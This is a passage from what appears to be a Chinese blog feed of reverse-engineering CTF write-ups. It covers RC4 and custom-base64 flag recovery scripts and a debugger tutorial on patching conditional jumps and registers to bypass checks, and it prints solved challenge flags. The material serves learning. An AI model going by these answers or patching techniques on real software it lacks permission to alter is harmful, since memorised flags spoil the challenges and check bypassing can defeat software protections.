LOAD_NAME                       8: i<br>        118     STORE_SUBSCR                    <br>        120     LOAD_NAME                       6: s<br>        122     LOAD_NAME                       7: j<br>        124     STORE_SUBSCR                    <br>        126     JUMP_ABSOLUTE                   64<br>        128     LOAD_CONST                      0: 0<br>        130     DUP_TOP                         <br>        132     STORE_NAME                      8: i<br>        134     STORE_NAME                      7: j<br>        136     BUILD_LIST                      0<br>        138     STORE_NAME                      10: data<br>        140     LOAD_NAME                       5: range<br>        142     LOAD_CONST                      7: 50<br>        144     CALL_FUNCTION                   1<br>        146     GET_ITER                        <br>        148     FOR_ITER                        88 (to 238)<br>        150     STORE_NAME                      11: _<br>        152     LOAD_NAME                       8: i<br>        154     LOAD_CONST                      8: 1<br>        156     BINARY_ADD                      <br>        158     LOAD_CONST                      6: 256<br>        160     BINARY_MODULO                   <br>        162     STORE_NAME                      8: i<br>        164     LOAD_NAME                       7: j<br>        166     LOAD_NAME                       6: s<br>        168     LOAD_NAME                       8: i<br>        170     BINARY_SUBSCR                   <br>        172     BINARY_ADD                      <br>        174     LOAD_CONST                      6: 256<br>        176     BINARY_MODULO                   <br>        178     STORE_NAME                      7: j<br>        180     LOAD_NAME                       6: s<br>        182     LOAD_NAME                       7: j<br>        184     BINARY_SUBSCR                   <br>        186     LOAD_NAME                       6: s<br>        188     LOAD_NAME                       8: i<br>        190     BINARY_SUBSCR                   <br>        192     ROT_TWO                         <br>        194     LOAD_NAME                       6: s<br>        196     LOAD_NAME                       8: i<br>        198     STORE_SUBSCR                    <br>        200     LOAD_NAME                       6: s<br>        202     LOAD_NAME                       7: j<br>        204     STORE_SUBSCR                    <br>        206     LOAD_NAME                       10: data<br>        208     LOAD_METHOD                     12: append<br>        210     LOAD_NAME                       6: s<br>        212     LOAD_NAME                       6: s<br>        214     LOAD_NAME                       8: i<br>        216     BINARY_SUBSCR                   <br>        218     LOAD_NAME                       6: s<br>        220     LOAD_NAME                       7: j<br>        222     BINARY_SUBSCR                   <br>        224     BINARY_ADD                      <br>        226     LOAD_CONST                      6: 256<br>        228     BINARY_MODULO                   <br>        230     BINARY_SUBSCR                   <br>        232     CALL_METHOD                     1<br>        234     POP_TOP                         <br>        236     JUMP_ABSOLUTE                   148<br>        238     LOAD_CONST                      9: &#x27;&#x27;<br>        240     STORE_NAME                      13: result<br>        242     LOAD_NAME                       14: zip<br>        244     LOAD_NAME                       2: text<br>        246     LOAD_NAME                       10: data<br>        248     CALL_FUNCTION                   2<br>        250     GET_ITER                        <br>        252     FOR_ITER                        32 (to 286)<br>        254     UNPACK_SEQUENCE                 2<br>        256     STORE_NAME                      15: c<br>        258     STORE_NAME                      16: k<br>        260     LOAD_NAME                       13: result<br>        262     LOAD_NAME                       17: chr<br>        264     LOAD_NAME                       18: ord<br>        266     LOAD_NAME                       15: c<br>        268     CALL_FUNCTION                   1<br>        270     LOAD_NAME                       16: k<br>        272     BINARY_XOR                      <br>        274     LOAD_CONST                      10: 51<br>        276     BINARY_XOR                      <br>        278     CALL_FUNCTION                   1<br>        280     INPLACE_ADD                     <br>        282     STORE_NAME                      13: result<br>        284     JUMP_ABSOLUTE                   252<br>        286     LOAD_NAME                       0: base64<br>        288     LOAD_METHOD                     19: b64encode<br>        290     LOAD_NAME                       13: result<br>        292     LOAD_METHOD                     20: encode<br>        294     CALL_METHOD                     0<br>        296     CALL_METHOD                     1<br>        298     LOAD_METHOD                     21: decode<br>        300     CALL_METHOD                     0<br>        302     STORE_NAME                      22: enc<br>        304     LOAD_NAME                       22: enc<br>        306     LOAD_CONST                      11: &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;<br>        308     COMPARE_OP                      2 (==)<br>        310     POP_JUMP_IF_FALSE               324<br>        314     LOAD_NAME                       23: print<br>        316     LOAD_CONST                      12: &#x27;yes!&#x27;<br>        318     CALL_FUNCTION                   1<br>        320     POP_TOP                         <br>        322     JUMP_FORWARD                    8 (to 332)<br>        324     LOAD_NAME                       23: print<br>        326     LOAD_CONST                      13: &#x27;try again...&#x27;<br>        328     CALL_FUNCTION                   1<br>        330     POP_TOP                         <br>        332     LOAD_CONST                      1: None<br>        334     RETURN_VALUE<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs plain">import base64<br><br># 原始密钥和加密的目标输出<br>key = &#x27;7e021a7dd49e4bd0837e22129682551b&#x27;<br>encoded_target = &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;<br><br># 处理密钥<br>processed_key = [ord(i) ^ 102 for i in key]<br><br># RC4 类似的流密码算法构建<br>s = list(range(256))<br>j = 0<br>for i in range(256):<br>    j = (j + s[i] + processed_key[i % len(processed_key)]) % 256<br>    s[i], s[j] = s[j], s[i]<br><br># 生成数据流 `data`<br>i = j = 0<br>data = []<br>for _ in range(50):  # 生成50个密钥流字节<br>    i = (i + 1) % 256<br>    j = (j + s[i]) % 256<br>    s[i], s[j] = s[j], s[i]<br>    data.append(s[(s[i] + s[j]) % 256])<br><br># 解码 `encoded_target` 并转换为原始字符串<br>target_bytes = base64.b64decode(encoded_target).decode()<br>decoded_text = &#x27;&#x27;<br><br># 使用 `data` 对 `target_bytes` 进行解码<br>for c, k in zip(target_bytes, data):<br>    decoded_text += chr((ord(c) ^ k) ^ 51)<br><br>print(&quot;Decoded text (flag):&quot;, decoded_text)<br></code></pre></td></tr></table></figure><h2 id="litctf-easyrc4"><a href="#litctf-easyrc4" class="headerlink" title="litctf-easyrc4"></a>litctf-easyrc4</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">__int64 __</span>fastcall rc4<span class="hljs-emphasis">_crypt(<span class="hljs-strong">__int64 a1, __</span>int64 a2, int i_</span>2, <span class="hljs-strong">__int64 a4)</span><br><span class="hljs-strong">&#123;</span><br><span class="hljs-strong">  __</span>int64 v4; // kr00<span class="hljs-emphasis">_8</span><br><span class="hljs-emphasis">  <span class="hljs-strong">__int64 i_1; // rax</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  int v8; // [rsp+30h] [rbp-10h]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  int v9; // [rsp+34h] [rbp-Ch]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  unsigned int i; // [rsp+38h] [rbp-8h]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  v8 = 0;</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  v9 = 0;</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  for ( i = 0; ; ++i )</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  &#123;</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">    i_1 = i;</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">    if ( (int)i &gt;= i_2 )</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">      break;</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">    v8 = (v8 + 1) % 256;</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">    v4 = *(unsigned __</span>int8 *)(v8 + a4) + v9;</span><br><span class="hljs-emphasis">    v9 = (unsigned <span class="hljs-strong">__int8)(HIBYTE(v4) + *(_BYTE *)(v8 + a4) + v9) - HIBYTE(HIDWORD(v4));</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">    swap(v8 + a4, a4 + v9);</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">    *(_BYTE *)((int)i + a2) = *(_BYTE *)((unsigned __</span>int8)(*(_</span>BYTE <span class="hljs-emphasis">*)(v8 + a4) + *</span>(<span class="hljs-emphasis">_BYTE *)(v9 + a4)) + a4) ^ *(_</span>BYTE <span class="hljs-emphasis">*)((int)i + a1) ^ 0x20;</span><br><span class="hljs-emphasis">  &#125;</span><br><span class="hljs-emphasis">  return i_1;</span><br><span class="hljs-emphasis">&#125;</span><br></code></pre></td></tr></table></figure><p>plaintext[i] &#x3D; cipher[i] ^ RC4_byte ^ 0x20</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from Crypto.Cipher import ARC4<br><br>key = b&quot;FenKey!!&quot;<br><br><br>cipher<span class="hljs-emphasis">_hex = (</span><br><span class="hljs-emphasis">    b&#x27;\x78\xCC\x4E\x13\x31\xF4\x73\x49&#x27;</span><br><span class="hljs-emphasis">    b&#x27;\x4F\x6C\x4F\x73\xC0\xF4\x35\x7E&#x27;</span><br><span class="hljs-emphasis">    b&#x27;\xCE\x27\x76\x4D\x19\x60\x7A\xEA&#x27;</span><br><span class="hljs-emphasis">    b&#x27;\x44\x5D\xC0\x42\x81\xDA\x1C\xF6&#x27;</span><br><span class="hljs-emphasis">    b&#x27;\x64\x72\x58\xD9\x94\xFA\xF8\x13&#x27;</span><br><span class="hljs-emphasis">)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"># 创建 RC4 加密器</span><br><span class="hljs-emphasis">rc4 = ARC4.new(key)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"># 获取 RC4 伪随机流</span><br><span class="hljs-emphasis">keystream = rc4.encrypt(b&#x27;\x00&#x27; * 40)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"># 解密：cipher ^ keystream ^ 0x20</span><br><span class="hljs-emphasis">plaintext = bytes([c ^ k ^ 0x20 for c, k in zip(cipher_</span>hex, keystream)])<br><br>print(&quot;Recovered flag:&quot;, plaintext.decode(errors=&#x27;ignore&#x27;))<br><br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-05-25 10:14:54<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/flp109atxsuqmrpm">https://www.yuque.com/chaye-apqbl/vsc85q/flp109atxsuqmrpm</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/index/"/>
    <url>/2026/01/19/RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/index/</url>
    
    <content type="html"><![CDATA[<h1 id="算法逆向"><a href="#算法逆向" class="headerlink" title="算法逆向"></a>算法逆向</h1><blockquote><p>更新: 2024-11-13 14:18:51<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/nwgvgu8h6nqrk5ob">https://www.yuque.com/chaye-apqbl/vsc85q/nwgvgu8h6nqrk5ob</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/base64exp%EF%BC%88%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%AE%9A%E4%B9%89key%EF%BC%89/"/>
    <url>/2026/01/19/RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/base64exp%EF%BC%88%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%AE%9A%E4%B9%89key%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="base64exp（可以自定义key）"><a href="#base64exp（可以自定义key）" class="headerlink" title="base64exp（可以自定义key）"></a>base64exp（可以自定义key）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs plain"># coding:utf-8<br><br>s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;<br><br><br># s = &quot;vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/&quot;<br><br>def My_base64_encode(inputs):<br>    # 将字符串转化为2进制<br>    bin_str = []<br>    for i in inputs:<br>        x = str(bin(ord(i))).replace(&#x27;0b&#x27;, &#x27;&#x27;)<br>        bin_str.append(&#x27;&#123;:0&gt;8&#125;&#x27;.format(x))<br>    # print(bin_str)<br>    # 输出的字符串<br>    outputs = &quot;&quot;<br>    # 不够三倍数，需补齐的次数<br>    nums = 0<br>    while bin_str:<br>        # 每次取三个字符的二进制<br>        temp_list = bin_str[:3]<br>        if (len(temp_list) != 3):<br>            nums = 3 - len(temp_list)<br>            while len(temp_list) &lt; 3:<br>                temp_list += [&#x27;0&#x27; * 8]<br>        temp_str = &quot;&quot;.join(temp_list)<br>        # print(temp_str)<br>        # 将三个8字节的二进制转换为4个十进制<br>        temp_str_list = []<br>        for i in range(0, 4):<br>            temp_str_list.append(int(temp_str[i * 6:(i + 1) * 6], 2))<br>        # print(temp_str_list)<br>        if nums:<br>            temp_str_list = temp_str_list[0:4 - nums]<br><br>        for i in temp_str_list:<br>            outputs += s[i]<br>        bin_str = bin_str[3:]<br>    outputs += nums * &#x27;=&#x27;<br>    print(&quot;Encrypted String:\n%s &quot; % outputs)<br><br><br>def My_base64_decode(inputs):<br>    # 将字符串转化为2进制<br>    bin_str = []<br>    for i in inputs:<br>        if i != &#x27;=&#x27;:<br>            x = str(bin(s.index(i))).replace(&#x27;0b&#x27;, &#x27;&#x27;)<br>            bin_str.append(&#x27;&#123;:0&gt;6&#125;&#x27;.format(x))<br>    # print(bin_str)<br>    # 输出的字符串<br>    outputs = &quot;&quot;<br>    nums = inputs.count(&#x27;=&#x27;)<br>    while bin_str:<br>        temp_list = bin_str[:4]<br>        temp_str = &quot;&quot;.join(temp_list)<br>        # print(temp_str)<br>        # 补足8位字节<br>        if (len(temp_str) % 8 != 0):<br>            temp_str = temp_str[0:-1 * nums * 2]<br>        # 将四个6字节的二进制转换为三个字符<br>        for i in range(0, int(len(temp_str) / 8)):<br>            outputs += chr(int(temp_str[i * 8:(i + 1) * 8], 2))<br>        bin_str = bin_str[4:]<br>    print(&quot;Decrypted String:\n%s &quot; % outputs)<br><br><br>print()<br>print(&quot;     *************************************&quot;)<br>print(&quot;     *    (1)encode         (2)decode    *&quot;)<br>print(&quot;     *************************************&quot;)<br>print()<br><br>num = input(&quot;Please select the operation you want to perform:\n&quot;)<br>if (num == &quot;1&quot;):<br>    input_str = input(&quot;Please enter a string that needs to be encrypted: \n&quot;)<br>    My_base64_encode(input_str)<br>else:<br>    input_str = input(&quot;Please enter a string that needs to be decrypted: \n&quot;)<br>    My_base64_decode(input_str)<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2024-11-13 14:28:53<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/uqyezecg83d0e741">https://www.yuque.com/chaye-apqbl/vsc85q/uqyezecg83d0e741</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/index/"/>
    <url>/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/index/</url>
    
    <content type="html"><![CDATA[<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><h1 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h1><p>F9调试</p><p>F7步入</p><p>F8步过</p><p>ctrl+F5 退出调试</p><h1 id="1、EASY"><a href="#1、EASY" class="headerlink" title="1、EASY"></a>1、EASY</h1><p>先查壳</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721275739405-86ee4b6f-8139-43f0-908b-962bbf8c80eb-213924.png" alt="1721275739405-86ee4b6f-8139-43f0-908b-962bbf8c80eb.png"></p><p>然后放入32位ida，发现main上面有个可疑函数，进去看一下</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721277905448-03ceace4-5c2c-4592-9f2e-2eee9ed093b7-192735.png" alt="1721277905448-03ceace4-5c2c-4592-9f2e-2eee9ed093b7.png"></p><p> 有个result&#x3D;putchar，那大概是没跑了</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721277956809-8992b404-510c-47b1-9416-047066f24ed8-547922.png" alt="1721277956809-8992b404-510c-47b1-9416-047066f24ed8.png"></p><p>设置一下断点，修改汇编代码，直接将call main改成call ques</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721277996156-6717ccd9-ea2f-471d-a361-036f32d06d76-453366.png" alt="1721277996156-6717ccd9-ea2f-471d-a361-036f32d06d76.png"></p><p>注意，先调试程序，再进行修改函数，</p><p>修改快捷键ctrl+alt+k</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721278087597-38200f83-bc9f-4e1a-ac4d-91a48803b710-809275.png" alt="1721278087597-38200f83-bc9f-4e1a-ac4d-91a48803b710.png"></p><p>然后F8步步跟进即可，两次就行</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721278242989-f4705a0a-5f76-4bd7-a01e-43bfddef85f5-729811.png" alt="1721278242989-f4705a0a-5f76-4bd7-a01e-43bfddef85f5.png"></p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721275644106-8f422287-94b0-4576-8357-bac121730d74-097981.png" alt="1721275644106-8f422287-94b0-4576-8357-bac121730d74.png"></p><p>NSSCTF{HACKIT4FUN}</p><h1 id="2、string"><a href="#2、string" class="headerlink" title="2、string"></a>2、string</h1><p>查壳发现是linux文件，等会放到kali里面调试</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721370316119-7415c381-eb3f-46f0-bfa9-887b6e23965d-907859.png" alt="1721370316119-7415c381-eb3f-46f0-bfa9-887b6e23965d.png"></p><p>先放到64位ida</p><p>跟进flag函数，发现是个随机种子生成函数</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721370275150-d9ad6fd2-3ec6-4bb0-8b36-f8347af37b39-519069.png" alt="1721370275150-d9ad6fd2-3ec6-4bb0-8b36-f8347af37b39.png"></p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721370369700-c6b41374-4367-4bcd-98eb-e68ad8d21b71-954116.png" alt="1721370369700-c6b41374-4367-4bcd-98eb-e68ad8d21b71.png"></p><p>找到seed</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721370256797-58113b77-0e1e-4143-b728-9867aea8fe4f-116982.png" alt="1721370256797-58113b77-0e1e-4143-b728-9867aea8fe4f.png"></p><p>然后编写脚本，按照种子生成伪随机数，即flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#include&lt;stdio.h&gt;</span><br><span class="hljs-comment">#include&lt;stdlib.h&gt;</span><br><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">main</span>()<br>&#123;<br>        <span class="hljs-keyword">int</span> seed=<span class="hljs-number">0x2766</span>;<br>        <span class="hljs-keyword">int</span> v4;<br>        <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;NSSCTF&#123;&quot;</span>);<br>        <span class="hljs-keyword">for</span>( <span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">13</span>; ++m )<br>        &#123;<br>        v4 =<span class="hljs-title function_ invoke__">rand</span>();<br>        <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, (unsigned <span class="hljs-keyword">int</span>)(v4 % <span class="hljs-number">8</span> + <span class="hljs-number">1</span>));<br>        &#125;<br>        <span class="hljs-title function_ invoke__">putchar</span>(<span class="hljs-number">125</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721371725133-4a109ec4-9cde-4838-b4f8-ad6c18613a2a-632022.png" alt="1721371725133-4a109ec4-9cde-4838-b4f8-ad6c18613a2a.png"></p><p><font style="color:#DF2A3F;">注意win里面生成的是错误的</font></p><p><font style="color:#DF2A3F;">因为系统不同，所以生成的种子也不同</font></p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721371756029-ecc85495-72e8-49a7-b22a-5ff7e5cb1511-078123.png" alt="1721371756029-ecc85495-72e8-49a7-b22a-5ff7e5cb1511.png"></p><h1 id="3、getflag"><a href="#3、getflag" class="headerlink" title="3、getflag"></a>3、getflag</h1><h2 id="注意：如果修改了汇编，patch后那么程序就会更改了，所以调试前最好备份一下"><a href="#注意：如果修改了汇编，patch后那么程序就会更改了，所以调试前最好备份一下" class="headerlink" title="注意：如果修改了汇编，patch后那么程序就会更改了，所以调试前最好备份一下"></a><font style="color:#DF2A3F;">注意：如果修改了汇编，patch后那么程序就会更改了，所以调试前最好备份一下</font></h2><p>如果你这么玩的话，那我只能修改你汇编指令了</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721543796759-86019a10-f0bf-44ac-b135-7da5c6661c8e-037937.png" alt="1721543796759-86019a10-f0bf-44ac-b135-7da5c6661c8e.png"></p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721544459743-6b4933db-25bf-421e-9e69-ab9bc417f268-075118.png" alt="1721544459743-6b4933db-25bf-421e-9e69-ab9bc417f268.png"></p><p>点到左边的check函数里面，看到要99999999次的click才能getflag，玩呢</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721544541003-61823652-60d6-4c09-8795-6fb1638a046f-536086.png" alt="1721544541003-61823652-60d6-4c09-8795-6fb1638a046f.png"></p><p>直接动态调试，先在比较cmp地方前面下一个断点<img src="/./img/49277317_v3H0juy_9_1K6pPz/1721556839738-a73b9ac7-7882-47f8-8a17-b02e26cdb767-882054.webp" alt="1721556839738-a73b9ac7-7882-47f8-8a17-b02e26cdb767.png"></p><h2 id="第一种办法，将判断条件修改，jg改成jle"><a href="#第一种办法，将判断条件修改，jg改成jle" class="headerlink" title="第一种办法，将判断条件修改，jg改成jle"></a>第一种办法，将判断条件修改，jg改成jle</h2><p>JG   ;有符号大于则跳转</p><p>JLE  ;有符号小于等于则跳转</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721548794441-06fefed3-aa4f-4d24-835c-d7ebaa3f3cb2-552563.png" alt="1721548794441-06fefed3-aa4f-4d24-835c-d7ebaa3f3cb2.png"></p><p>然后本地调试即可</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721548029980-acd6b0d0-d184-40c2-877b-5bf3a4f44d05-468002.png" alt="1721548029980-acd6b0d0-d184-40c2-877b-5bf3a4f44d05.png"></p><h2 id="第二种，调试时修改寄存器的内容"><a href="#第二种，调试时修改寄存器的内容" class="headerlink" title="第二种，调试时修改寄存器的内容"></a>第二种，调试时修改寄存器的内容</h2><p>CMP</p><p>功能: 比较OP1与OP2的值</p><p>语法: CMP r&#x2F;m,r&#x2F;m&#x2F;data</p><p>标志位: C,P,A,Z,O</p><p>MOV</p><p><strong>功能: 把源操作数送给目的操作数</strong></p><p><strong>语法: MOV 目的操作数,源操作数</strong></p><p><strong>格式: MOV r1,r2</strong></p><p><strong>MOV r,m</strong></p><p><strong>MOV m,r</strong></p><p><strong>MOV r,data</strong></p><hr><p><strong>在比较cmp前面下个断点，然后F7步过进入cmp，修改左上角eax寄存器的值，只要大于0x5E5E0FFh</strong></p><p><strong>点击eax，右键modify，修改数值即可</strong></p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721551040498-86f5836c-2205-4dd9-9aea-d0d996495135-219070.png" alt="1721551040498-86f5836c-2205-4dd9-9aea-d0d996495135.png"></p><p>我这边就修改的比他大1，为5F5E1000，进了一位，然后再F7步过就可以跳到flag分支了</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721551388752-2c3260fd-7c9f-492e-aedb-ccb529ece0c8-398025.png" alt="1721551388752-2c3260fd-7c9f-492e-aedb-ccb529ece0c8.png"></p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721551447323-ee15ef0a-c340-439d-b86e-3ffa4da9ecc8-122203.png" alt="1721551447323-ee15ef0a-c340-439d-b86e-3ffa4da9ecc8.png"></p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721551458819-a02738d9-f2ac-428f-a4e1-1bb07bdef89d-388480.png" alt="1721551458819-a02738d9-f2ac-428f-a4e1-1bb07bdef89d.png"></p><p>成功跳转后，F9运行程序即可</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721551205280-0d468676-ce93-4c86-ad1d-4994326f8e16-900754.png" alt="1721551205280-0d468676-ce93-4c86-ad1d-4994326f8e16.png"></p><p>NSSCTF{MFC_pr0gr4mming_is_awes0m3}</p><h1 id="4、贪吃蛇"><a href="#4、贪吃蛇" class="headerlink" title="4、贪吃蛇"></a>4、贪吃蛇</h1><p>32位</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721632502706-32eebb9a-c3d5-4a83-99d4-fa75788e1da1-340061.png" alt="1721632502706-32eebb9a-c3d5-4a83-99d4-fa75788e1da1.png"></p><p>放入ida,随便看一下函数</p><p>将jle改成jg,保存一下然后动调即可</p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721632579200-053270d8-a944-412f-aa40-75c5e4445ce4-375701.png" alt="1721632579200-053270d8-a944-412f-aa40-75c5e4445ce4.png"></p><p><img src="/./img/49277317_v3H0juy_9_1K6pPz/1721632347532-7f325c25-c1dd-4d21-9156-be0a75161de8-238923.png" alt="1721632347532-7f325c25-c1dd-4d21-9156-be0a75161de8.png"></p><p>NSSCTF{YourAreTheMasterOfGame!}</p><blockquote><p>更新: 2024-10-24 10:04:04<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/chld642z56nkhary">https://www.yuque.com/chaye-apqbl/vsc85q/chld642z56nkhary</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
